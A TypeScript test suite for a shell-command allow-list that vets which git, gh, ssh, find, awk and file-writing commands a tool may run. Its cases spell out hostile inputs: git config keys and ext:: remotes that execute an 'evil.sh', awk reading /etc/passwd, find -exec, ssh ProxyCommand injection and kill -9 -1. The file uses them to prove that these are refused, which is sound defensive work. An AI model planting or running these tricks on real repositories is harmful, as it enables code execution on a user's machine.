  script('tools/src.sh', '. ./tools/lib.sh');
  assert.match(hook(repo, './tools/src.sh').problem ?? '', /runs dirname with `\$0`/);
  // node_modules/.bin/convex must lead to the convex package.
  const bin = path.join(repo, 'node_modules/.bin/convex');
  const run = 'npx convex run --prod stats:overview';
  for (const target of [path.join(root, 'payload'), '../../evil.sh', '../nowhere']) {
    fs.writeFileSync(path.join(root, 'payload'), '#!/bin/sh\n');
    fs.rmSync(bin);
    fs.symlinkSync(target, bin);
    assert.match(live(repo, run).problem ?? '', /not the convex package/, target);
  }
  fs.rmSync(bin);
  fs.symlinkSync('../convex/bin/main.js', bin);
  assert.equal(live(repo, run).problem, undefined);
  // pnpm's layout is fine.
  write(repo, { 'node_modules/.pnpm/convex@1/node_modules/convex/bin/main.js': 'console.log(1);\n' });
  fs.rmSync(bin);
  fs.symlinkSync('../.pnpm/convex@1/node_modules/convex/bin/main.js', bin);
  assert.equal(live(repo, run).problem, undefined);
  // As is a shim, a plain file there.
  fs.rmSync(bin);
  fs.writeFileSync(bin, '#!/bin/sh\nexec node ../convex/bin/main.js "$@"\n');
  assert.equal(live(repo, run).problem, undefined);
  // A file that's run is held to the hash, whatever it's called.
  const { files, blocked } = await trustedFiles(repo, ['node scripts/build.mjs']);
  write(repo, { 'scripts/report.svg': 'console.log(1);\n', 'tools/x.png': '#!/bin/sh\necho 1\n' });
  fs.chmodSync(path.join(repo, 'tools/x.png'), 0o755);
  assert.match(liveCommandProblem('node scripts/report.svg', repo, files, blocked) ?? '', /report\.svg, which patch trust didn't hash/);
  assert.match(liveCommandProblem('./tools/x.png', repo, files, blocked) ?? '', /x\.png, which patch trust didn't hash/);
});

test('R4: every word of a listed program is literal, but for a pattern that starts with literal text; find runs, deletes and writes nothing', () => {
  const { repo } = mikesRepo();
  refusedLive(repo, [
    ['s=$(cat /dev/null); cat "$s"', /runs cat with `\$s`, worked out as it runs/],
    ['s=$(cat /dev/null); git rev-list --count "$s"', /runs git with `\$s`/],
    ['git merge-base --is-ancestor $(cat /dev/null) origin/main', /worked out as it runs/],
    ['h=$(cat /dev/null); ssh -o BatchMode=yes "$h" ls', /worked out as it runs/],
    ['s=$(cat /dev/null); ssh bruce "ls $s"', /worked out as it runs/],
    ['s=$(cat /dev/null); grep -c "$s"', /runs grep with `\$s`, worked out as it runs/],
    ['s=$(cat /dev/null); grep -c $s', /worked out as it runs/],
    ['s=$(cat /dev/null); grep -c "-$s"', /worked out as it runs/],
    ['grep -c "a$@"', /worked out as it runs/],
    ['s=$(cat /dev/null); node scripts/build.mjs "$s"', /worked out as it runs/],
    ['s=$(cat /dev/null); echo "$s"', /runs echo with `\$s`/],
    ['s=$(cat /dev/null); kill $s', /`kill` with `\$s`, which isn't `\$!`/],
    ['p=$!; p=x; kill $p', /`kill` with `\$p`/],
    ['( p=$! ); kill $p', /`kill` with `\$p`/],
    ['kill 1', /`kill` with `1`/],
    ['kill -9 -1', /`kill` with `-1`/],
  ]);
  // The pattern slot takes a quoted word that starts with literal text.
  assert.equal(live(repo, 's=$(cat /dev/null); grep -c "adb-$s"').problem, undefined);
  refusedHook(repo, [
    ['find . -delete', /find -delete/],
    ["find . -exec id ';'", /find -exec/],
    ["find . -execdir id ';'", /find -execdir/],
    ["find . -ok id ';'", /find -ok/],
    ['find . -fprint /tmp/x', /find -fprint/],
    ['find "$x" -name y', /runs find with `\$x`/],
    ['find . -name "$(cat /dev/null)"', /runs find with `\$\(\.\.\.\)`/],
    ['cat "$(cat /dev/null)"', /runs cat with/],
    ['x=$(cat /dev/null); ./tools/count.sh "$x"', /runs \.\/tools\/count\.sh with `\$x`/],
  ]);
});

test('R5: git runs only the read-only subcommands cannvas uses, in a repo whose own config adds nothing git runs', () => {
  const { repo } = mikesRepo();
  refusedLive(repo, [
    ['git stash', /`git stash`/],
    ['git stash list', /`git stash`/],
    ['git log -p', /`git log`/],
    ['git diff', /`git diff`/],
    ['git branch evil', /1 word after its options/],
    ['git branch -D main', /`git branch -D`/],
    ["git branch --format='%(signature)'", /`git branch --format` with/],
    ['git fetch origin main:refs/heads/x', /`main:refs\/heads\/x`/],
    ['git fetch file:///tmp/x', /`file:\/\/\/tmp\/x`/],
    ['git fetch ext::sh', /`ext::sh`/],
    ['git -c core.fsmonitor= status', /`git -c`/],
    ['git rev-list --count --all', /`git rev-list --all`/],
    ['git merge-base a b', /without --is-ancestor/],
  ]);
  // What a repo's own config can set that makes git run something.
  for (const [key, value] of [
    ['core.hooksPath', './hooks'],
    ['core.fsmonitor', './fsm.sh'],
    ['core.sshCommand', 'sh -c id'],
    ['core.pager', 'sh -c id'],
    ['core.alternateRefsCommand', 'id'],
    ['include.path', '../inc'],
    ['filter.x.clean', 'id'],
    ['diff.x.textconv', 'id'],
    ['alias.fetch', '!id'],
    ['url.ext::.insteadOf', 'https://'],
    ['protocol.ext.allow', 'always'],
    ['remote.origin.vcs', 'evil'],
    ['gpg.program', 'id'],
    ['fetch.recurseSubmodules', 'yes'],
    ['http.cookieFile', '/tmp/x'],
  ] as const) {
    git(repo, 'config', key, value);
    assert.match(live(repo, 'git fetch -q origin main').problem ?? 'accepted', new RegExp(`own git config sets ${key.toLowerCase().replace(/[.]/g, '\\.')}`), key);
    assert.match(live(repo, 'gh pr list --state merged').problem ?? 'accepted', /own git config sets/, `gh beside ${key}`);
    git(repo, 'config', '--unset-all', key);
  }
  for (const url of ['ext::sh -c id', '/tmp/other', '../other', 'file:///tmp/x', 'git://host/x']) {
    git(repo, 'config', 'remote.origin.url', url);
    assert.match(live(repo, 'git fetch -q origin main').problem ?? 'accepted', /isn't reached over https or ssh/, url);
  }
  for (const url of ['https://github.com/a/b.git', 'git@github.com:a/b.git', 'ssh://git@host/x']) {
    git(repo, 'config', 'remote.origin.url', url);
    assert.equal(live(repo, 'git fetch -q origin main').problem, undefined, url);
  }
  // A credential helper of the repo's is let be: liveCommandEnv turns it off.
  git(repo, 'config', 'credential.https://example.com.helper', '!id');
  assert.equal(live(repo, 'git fetch -q origin main').problem, undefined);
  assert.equal(repoGitConfigProblem(repo), undefined);
  // An included file is read too (and include.* itself isn't allowed).
  fs.writeFileSync(path.join(repo, '.git/inc'), '[core]\n\tfsmonitor = ./x\n');
  git(repo, 'config', 'include.path', 'inc');
  assert.match(repoGitConfigProblem(repo) ?? '', /sets (include\.path|core\.fsmonitor)/);
});

test("R5: liveCommandEnv's settings beat the repo's own config, so the attacks it could make don't run", () => {
  const { repo, root } = mikesRepo();
  const marker = path.join(root, 'ran');
  const script = path.join(root, 'evil.sh');
  fs.writeFileSync(script, `#!/bin/sh\ntouch ${marker}\nexit 1\n`);
  fs.chmodSync(script, 0o755);
  const env: Record<string, string | undefined> = { ...process.env, GIT_CONFIG_GLOBAL: path.join(root, 'no-global'), GIT_CONFIG_NOSYSTEM: '1', GIT_TERMINAL_PROMPT: '0' };
  // Nothing of the test host's own that would hide an attack.
  for (const k of ['GIT_ASKPASS', 'SSH_ASKPASS', 'GIT_SSH_COMMAND', 'GIT_SSH', 'GIT_CONFIG_COUNT']) delete env[k];
  const sh = (cmd: string, withEnv: boolean) => spawnSync('/bin/sh', ['-c', cmd], { cwd: repo, env: (withEnv ? { ...env, ...liveCommandEnv(env) } : env) as NodeJS.ProcessEnv, timeout: 20_000, input: '' });
  const ran = () => {
    const r = fs.existsSync(marker);
    fs.rmSync(marker, { force: true });
    return r;
  };
  // Each attack, played once without the settings (it runs) and once with (it doesn't).
  const attacks: { name: string; setup: () => void; cmd: string; undo: () => void }[] = [
    { name: 'fsmonitor', setup: () => git(repo, 'config', 'core.fsmonitor', script), cmd: 'git status --porcelain', undo: () => git(repo, 'config', '--unset', 'core.fsmonitor') },
    {
      name: 'hooks',
      setup: () => {
        write(repo, { '.git/hooks/pre-commit': `#!/bin/sh\ntouch ${marker}\n` });
        fs.chmodSync(path.join(repo, '.git/hooks/pre-commit'), 0o755);
      },
      cmd: 'git -c user.email=t@t -c user.name=t commit -q --allow-empty -m x',
      undo: () => fs.rmSync(path.join(repo, '.git/hooks/pre-commit')),
    },
    {
      name: 'ext:: remote',
      setup: () => {
        git(repo, 'config', 'protocol.ext.allow', 'always');
        git(repo, 'remote', 'add', 'evil', `ext::${script}`);
      },
      cmd: 'git fetch -q evil main',
      undo: () => {
        git(repo, 'remote', 'remove', 'evil');
        git(repo, 'config', '--unset', 'protocol.ext.allow');
      },
    },
    {
      name: 'core.sshCommand',
      setup: () => {
        git(repo, 'config', 'core.sshCommand', script);
        git(repo, 'remote', 'add', 'far', 'ssh://127.0.0.1:1/x');
      },
      cmd: 'git fetch -q far main',
      undo: () => {
        git(repo, 'remote', 'remove', 'far');
        git(repo, 'config', '--unset', 'core.sshCommand');
      },
    },
    {
      name: 'credential helper',
      setup: () => git(repo, 'config', 'credential.https://example.com.helper', `!${script}`),
      cmd: "printf 'protocol=https\\nhost=example.com\\n\\n' | git credential fill",
      undo: () => git(repo, 'config', '--unset-all', 'credential.https://example.com.helper'),
    },
    {
      name: 'askpass',
      setup: () => git(repo, 'config', 'core.askPass', script),
      cmd: "printf 'protocol=https\\nhost=example.com\\n\\n' | git credential fill",
      undo: () => git(repo, 'config', '--unset', 'core.askPass'),
    },
  ];
  for (const a of attacks) {
    a.setup();
    ran();
    sh(a.cmd, false);
    assert.equal(ran(), true, `${a.name} runs without the settings (the test plays it right)`);
    sh(a.cmd, true);
    assert.equal(ran(), false, `${a.name} doesn't run with them`);
    a.undo();
  }
  // And what each forced setting reads as, against a repo that says otherwise.
  for (const [k, v] of [['http.saveCookies', 'true'], ['fetch.recurseSubmodules', 'yes'], ['submodule.recurse', 'true'], ['protocol.allow', 'always'], ['safe.bareRepository', 'all']]) git(repo, 'config', k, v);
  const read = (k: string) => sh(`git config --get ${k}`, true).stdout.toString().trim();
  assert.equal(read('http.saveCookies'), 'false');
  assert.equal(read('fetch.recurseSubmodules'), 'false');
  assert.equal(read('submodule.recurse'), 'false');
  assert.equal(read('protocol.allow'), 'never');
  assert.equal(read('core.hooksPath'), '/dev/null');
  // Your own helpers come back after the reset, in order.
  const global2 = path.join(root, 'global2');
  fs.writeFileSync(global2, '[credential "https://github.com"]\n\thelper =\n\thelper = !gh auth git-credential\n');
  const e = liveCommandEnv({ ...env, GIT_CONFIG_GLOBAL: global2 });
  const pairs = Array.from({ length: Number(e.GIT_CONFIG_COUNT) }, (_, i) => `${e[`GIT_CONFIG_KEY_${i}`]}=${e[`GIT_CONFIG_VALUE_${i}`]}`);
  assert.ok(pairs.includes('core.sshCommand=ssh'));
  assert.ok(pairs.indexOf('credential.helper=') > pairs.indexOf('core.hooksPath=/dev/null'));
  assert.deepEqual(pairs.slice(-2), ['credential.https://github.com.helper=', 'credential.https://github.com.helper=!gh auth git-credential']);
  // A GIT_CONFIG_COUNT already in the environment is kept, and added to.
  const more = liveCommandEnv({ ...env, GIT_CONFIG_COUNT: '2' });
  assert.equal(more.GIT_CONFIG_KEY_2, 'core.fsmonitor');
  assert.equal(more.GIT_CONFIG_KEY_0, undefined);
});

test("R5: a repo's filter drivers don't run: its own are refused, and your own don't for the live list's git commands, which don't read the working tree", () => {
  const { repo, root } = mikesRepo();
  git(repo, 'config', 'filter.x.clean', 'id');
  assert.match(repoGitConfigProblem(repo) ?? '', /sets filter\.x\.clean/);
  git(repo, 'config', '--unset', 'filter.x.clean');
  // A global filter (git-lfs, say) a repo's .gitattributes names, with the file stat-dirty.
  const marker = path.join(root, 'filter.ran');
  const global = path.join(root, 'global');
  fs.writeFileSync(global, `[filter "x"]\n\tclean = touch ${marker}; cat\n`);
  write(repo, { '.gitattributes': '* filter=x\n', 'a.txt': 'one\n' });
  git(repo, 'add', 'a.txt', '.gitattributes');
  git(repo, 'commit', '-qm', 'two');
  fs.rmSync(marker, { force: true });
  fs.appendFileSync(path.join(repo, 'a.txt'), 'two\n');
  const env: Record<string, string | undefined> = { ...process.env, GIT_CONFIG_GLOBAL: global };
  const e = { ...env, ...liveCommandEnv(env) } as NodeJS.ProcessEnv;
  for (const cmd of ['git merge-base --is-ancestor HEAD HEAD', 'git rev-list --count HEAD', "git branch -a --no-merged HEAD --format='%(refname:short)'"]) {
    assert.equal(live(repo, cmd).problem, undefined, cmd);
    spawnSync('/bin/sh', ['-c', cmd], { cwd: repo, env: e, timeout: 20_000 });
    assert.equal(fs.existsSync(marker), false, cmd);
  }
  // (The same global filter does run for git status, which isn't on the list.)
  spawnSync('/bin/sh', ['-c', 'git status --porcelain'], { cwd: repo, env: e, timeout: 20_000 });
  assert.equal(fs.existsSync(marker), true, 'the test plays it right');
});

test('R6: gh runs only `gh pr list`, with the options cannvas uses', () => {
  const { repo } = mikesRepo();
  assert.equal(live(repo, MIKES.cannvasMerged).problem, undefined);
  refusedLive(repo, [
    ['gh pr view 1', /`gh pr view`/],
    ['gh pr checkout 1', /`gh pr checkout`/],
    ['gh api repos/x/y', /`gh api repos\/x\/y`/],
    ['gh repo clone x/y', /`gh repo clone`/],
    ['gh extension exec x', /`gh extension exec`/],
    ['gh alias set x y', /`gh alias set`/],
    ['gh pr list --jq .', /`gh pr list --jq`/],
    ['gh pr list -R evil/x', /`gh pr list -R`/],
    ["gh pr list --template '{{.}}'", /`gh pr list --template`/],
    ['gh pr list --state evil', /`gh pr list --state` with `evil`/],
    ['gh pr list extra', /1 word after its options/],
  ]);
});

test("R7: programs that can write a file run only in forms that can't", () => {
  const { repo } = mikesRepo();
  const both: [string, RegExp][] = [
    ['tee /tmp/x', /runs tee, which isn't on the short list/],
    ['cp a b', /runs cp/],
    ['mv a b', /runs mv/],
    ['rm -f x', /runs rm/],
    ['touch x', /runs touch/],
    ['mkdir x', /runs mkdir/],
    ['ln -s a b', /runs ln/],
    ['chmod 777 x', /runs chmod/],
    ['mktemp', /runs mktemp/],
    ['sort -o /tmp/x a', /runs sort/],
    ['sort a', /runs sort/],
    ["sed 's/a/b/w /tmp/x' a", /runs sed/],
    ["sed -n 'e id' a", /runs sed/],
    ['sed -i s/a/b/ a', /runs sed/],
    ['curl -o /tmp/x https://example.com', /runs curl/],
    ['curl https://example.com', /runs curl/],
    ['wget https://example.com', /runs wget/],
    ['dd if=/dev/zero of=/tmp/x', /runs dd/],
  ];
  refusedLive(repo, both);
  refusedHook(repo, both);
  refusedLive(repo, [
    // On the other machine too, only what his patches run there.
    ["ssh bruce 'rm -rf x'", /has `rm`/],
    ['ssh bruce rm -rf x', /`ssh -rf`/],
    ["ssh bruce 'launchctl load x'", /ssh's launchctl with 2 words/],
    ["ssh bruce 'readlink x > /tmp/y'", /has a redirect/],
    ["ssh bruce 'readlink x & echo'", /has `&`/],
    ["ssh bruce '{ readlink x; }'", /has a group/],
    ["ssh bruce 'readlink $(id)'", /has a word worked out as it runs/],
    ["ssh bruce 'python3 -c 1'", /has `python3`/],
    ['ssh bruce', /0 words after its options|1 word after its options/],
    ['ssh -E /tmp/log bruce ls', /`ssh -E`/],
    ['ssh -S /tmp/ctl bruce ls', /`ssh -S`/],
    ['ssh -i ./key bruce ls', /`ssh -i`/],
    ['ssh -o UserKnownHostsFile=/tmp/x bruce ls', /`ssh -o` with `UserKnownHostsFile/],
    ['ssh -o ControlPath=/tmp/x bruce ls', /`ssh -o` with `ControlPath/],
    ['ssh -o IdentityFile=./k bruce ls', /`ssh -o` with `IdentityFile/],
    ['ssh bruce -oProxyCommand=id ls', /`ssh -oProxyCommand=id`/],
    ['awk \'{ print > "/tmp/x" }\' /dev/null', /runs awk/],
  ]);
  refusedHook(repo, [
    ['awk \'{ print > "/tmp/x" }\' /dev/null', /awk program that may run a command or write a file/],
    ['awk \'{ printf "x" >> "/tmp/x" }\' /dev/null', /awk program/],
    ['awk \'{ print | "sh" }\' /dev/null', /awk program/],
    ['awk \'BEGIN { system("id") }\'', /awk program/],
    ['awk \'BEGIN { while ((getline l < "/etc/passwd") > 0) print l }\'', /awk program/],
    ['awk -f ./prog.awk /dev/null', /`awk -f`|runs awk -f/],
    ['say -o /tmp/x.aiff hi', /runs say -o/],
    ['say --output-file=/tmp/x hi', /runs say --output-file/],
    ['uniq /dev/null /tmp/out', /uniq with two files/],
  ]);
});

test('R8: output goes only to /dev/null or another descriptor, in the command and in every script it runs', () => {
  const { repo } = mikesRepo();
  const cases: [string, RegExp][] = [
    ['echo x > /tmp/x', /writes to \/tmp\/x \(`>`\)/],
    ['echo x >> ./log', /writes to \.\/log \(`>>`\)/],
    ['echo x 2>./err', /writes to \.\/err/],
    ['{ echo x; } > /tmp/x', /writes to \/tmp\/x/],
    ['( echo x ) >/tmp/x', /writes to \/tmp\/x/],
    ['echo x > /dev/./null', /writes to \/dev\/\.\/null/],
    ['echo x > /dev/null/../../tmp/x', /writes to/],
    ['echo x >"$HOME/x"', /file worked out as it runs/],
    ['echo x > ~/x', /file worked out as it runs/],
  ];
  refusedLive(repo, cases);
  refusedHook(repo, cases);
  for (const ok of ['echo x >/dev/null 2>&1', 'echo x 2>/dev/null', 'echo x >&2', 'echo x 1>&-', 'echo x >>/dev/null', 'cat /dev/null </dev/null >/dev/null']) {
    assert.equal(live(repo, ok).problem, undefined, ok);
    assert.equal(hook(repo, ok).problem, undefined, ok);
  }
  // A script a hook runs, and a package script, are held to it too.
  write(repo, {
    'tools/log.sh': '#!/bin/sh\necho start\necho x >> .claude/log.txt\n',
    'tools/ok.sh': '#!/bin/sh\necho x >/dev/null 2>&1\n',
    'package.json': JSON.stringify({ name: 'app', scripts: { log: 'echo x > out.txt' } }),
  });
  assert.match(hook(repo, './tools/log.sh').problem ?? '', /tools\/log\.sh line 3 writes to \.claude\/log\.txt/);
  assert.equal(hook(repo, './tools/ok.sh').problem, undefined);
  assert.match(hook(repo, 'npm run log').problem ?? '', /"log" script line 1 writes to out\.txt/);
});

test("R9: a script outside the repo runs only if it's on the list, and it and every folder on its way are yours or root's, writable by nobody else, and it fully resolves", () => {
  const { repo, home, root } = mikesRepo();
  fs.chmodSync(root, 0o755);
  const scripts = path.join(home, 'dev/me/poddle/scripts');
  const x = path.join(scripts, 'asc-status.mjs');
  const asc = () => live(repo, MIKES_OUTSIDE.ascStatus, { home }).problem;
  assert.equal(asc(), undefined);
  // Only the listed script, and only with the words it takes.
  const other = path.join(root, 'other');
  write(other, { 'y.mjs': 'console.log(1);\n', 'node_modules/npm/bin/npm-cli.js': 'console.log(1);\n' });
  tidy(other);
  assert.match(live(repo, 'node ~/dev/me/poddle/scripts/missing.mjs', { home }).problem ?? '', /isn't on the short list/);
  assert.match(live(repo, `node ${other}/y.mjs`, { home }).problem ?? '', /isn't on the short list/);
  assert.match(live(repo, 'node ~/dev/me/poddle/scripts/asc-status.mjs --evil', { home }).problem ?? '', /with `--evil`/);
  // The file writable by its group, or by anyone.
  for (const mode of [0o664, 0o646]) {
    fs.chmodSync(x, mode);
    assert.match(asc() ?? '', /is a file someone else could change/, mode.toString(8));
  }
  fs.chmodSync(x, 0o644);
  // A folder on the way writable by its group, or by anyone without the sticky bit.
  for (const dir of [scripts, path.join(home, 'dev/me'), home]) {
    for (const mode of [0o775, 0o777, 0o757]) {
      fs.chmodSync(dir, mode);
      assert.match(asc() ?? '', /is a folder someone else could change/, `${dir} ${mode.toString(8)}`);
    }
    // A sticky one (like /tmp) is fine: only an entry's owner can rename it.
    fs.chmodSync(dir, 0o1777);
    assert.equal(asc(), undefined, `${dir} sticky`);
    fs.chmodSync(dir, 0o755);
  }
  // A link is followed, and each folder it passes through checked too.
  fs.rmSync(x);
  fs.symlinkSync(path.join(other, 'y.mjs'), x);
  assert.equal(asc(), undefined);
  fs.chmodSync(other, 0o775);
  assert.match(asc() ?? '', new RegExp(`${other.replace(/[/.]/g, '\\$&')} is a folder someone else could change`));
  fs.chmodSync(other, 0o755);
  // Through a link in a folder others can write, so it can be pointed elsewhere.
  const shared = path.join(root, 'shared');
  write(shared, {});
  fs.mkdirSync(shared, { mode: 0o755 });
  fs.symlinkSync(path.join(other, 'y.mjs'), path.join(shared, 'hop.mjs'));
  fs.rmSync(x);
  fs.symlinkSync(path.join(shared, 'hop.mjs'), x);
  assert.equal(asc(), undefined);
  fs.chmodSync(shared, 0o777);
  assert.match(asc() ?? '', /shared is a folder someone else could change/);
  fs.chmodSync(shared, 0o755);
  // A link to nowhere doesn't resolve.
  fs.rmSync(x);
  fs.symlinkSync(path.join(other, 'gone.mjs'), x);
  assert.match(asc() ?? '', /isn't a file there now|isn't there/);
  fs.rmSync(x);
  fs.writeFileSync(x, 'console.log(1);\n');
  fs.chmodSync(x, 0o644);
  // A hook or program by its path is held to the same, without `..`, and
  // not to a package's program, which runs what it's told.
  assert.equal(hook(repo, `node ${other}/y.mjs`).problem, undefined);
  assert.match(hook(repo, `node ${other}/../other/y.mjs`).problem ?? '', /with `\.` or `\.\.` in it/);
  assert.match(hook(repo, `node ${other}/node_modules/npm/bin/npm-cli.js exec evil`).problem ?? '', /a package's program outside the repo/);
  write(shared, { tool: '#!/bin/sh\necho\n' });
  fs.chmodSync(path.join(shared, 'tool'), 0o775);
  assert.match(hook(repo, `${shared}/tool`).problem ?? '', /someone else could change/);
  // The function itself, on a system path.
  assert.equal(ownedPathProblem('/bin/sh'), undefined);
  assert.match(ownedPathProblem(path.join(root, 'nope')) ?? '', /isn't there/);
  // macOS: an access list that lets someone else write is refused whatever the mode says.
  if (process.platform === 'darwin') {
    execFileSync('/bin/chmod', ['+a', 'group:everyone allow write,append', x]);
    assert.match(asc() ?? '', /an access list there lets group:everyone write/);
    execFileSync('/bin/chmod', ['-N', x]);
    execFileSync('/bin/chmod', ['+a', 'group:everyone allow add_file,delete_child', scripts]);
    assert.match(asc() ?? '', /an access list there lets group:everyone write/);
    execFileSync('/bin/chmod', ['-N', scripts]);
    // A deny entry (macOS puts one on your home folder) is fine.
    execFileSync('/bin/chmod', ['+a', 'group:everyone deny delete', scripts]);
    assert.equal(asc(), undefined, 'deny');
    execFileSync('/bin/chmod', ['-N', scripts]);
  }
  // Mike's real one, where it is on this machine.
  const real = path.join(os.homedir(), 'dev/me/poddle/scripts/asc-status.mjs');
  if (fs.existsSync(real) && os.userInfo().username === 'm5-mike') assert.equal(ownedPathProblem(real), undefined, real);
});

test("R10: a live command's `&` can't outlive it: its process group gets SIGTERM, then SIGKILL after a short grace", async () => {
  const dir = tmpDir();
  const gone = async (pid: number, ms: number) => {
    for (const end = Date.now() + ms; Date.now() < end; ) {
      try {
        process.kill(pid, 0);
      } catch {
        return true;
      }
      await new Promise((r) => setTimeout(r, 20));
    }
    return false;
  };
  const out = await runCommand('sleep 30 >/dev/null 2>&1 & echo $!', { cwd: dir, env: process.env, shell: ['/bin/sh', '-c'], killGroup: true });
  assert.equal(await gone(Number(out.text.trim()), 1000), true, 'the background sleep ended with the shell (SIGTERM)');
  // One that ignores SIGTERM gets SIGKILL once the grace is up.
  const stubborn = await runCommand("trap '' TERM; sleep 30 >/dev/null 2>&1 & echo $!", { cwd: dir, env: process.env, shell: ['/bin/sh', '-c'], killGroup: true, killGraceMs: 300 });
  const pid = Number(stubborn.text.trim());
  assert.ok(pid > 0);
  await new Promise((r) => setTimeout(r, 100));
  assert.equal(await gone(pid, 50), false, 'SIGTERM alone left it');
  assert.equal(await gone(pid, 2000), true, 'SIGKILL ended it');
  // And on a timeout: the shell itself ignoring SIGTERM, holding the output open.
  const started = Date.now();
  const timed = await runCommand("trap '' TERM; sleep 30", { cwd: dir, env: process.env, shell: ['/bin/sh', '-c'], killGroup: true, killGraceMs: 200, timeoutMs: 200 });
  assert.match(timed.text, /Stopped after/);
  assert.ok(Date.now() - started < 5000, 'SIGKILL ended it after the grace');
  // A program in a session of its own isn't reached (docs/protocol.md), but
  // its holding our output doesn't keep the command's answer waiting.
  const before = Date.now();
  const session = await runCommand(`${JSON.stringify(process.execPath)} -e "const c = require('child_process').spawn('sleep', ['30'], { detached: true, stdio: 'inherit' }); console.log(c.pid); c.unref()"`, { cwd: dir, env: process.env, shell: ['/bin/sh', '-c'], killGroup: true, killGraceMs: 200 });
  const left = Number(session.text.trim());
  assert.ok(left > 0, session.text);
  assert.ok(Date.now() - before < 5000, 'the answer came back');
  assert.equal(await gone(left, 100), false, "it's documented as not covered");
  process.kill(left, 'SIGKILL');
});
